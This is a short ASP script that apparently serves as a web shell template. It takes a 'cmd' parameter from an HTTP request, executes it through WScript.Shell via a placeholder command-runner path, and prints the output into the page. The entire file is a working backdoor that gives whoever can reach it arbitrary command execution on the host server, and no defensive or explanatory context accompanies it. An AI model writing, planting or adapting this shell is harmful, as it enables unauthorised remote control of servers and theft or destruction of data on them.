<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")

cmd = request("cmd")

output = ""
If (cmd <> "") Then
  output = oScript.Exec ("WRITABLE_DIR\RUNCMD_EXE """ & cmd & """").stdout.readall
End If
%>

<pre><%
If (output <> "") Then
  Response.Write output
End If
%></pre>
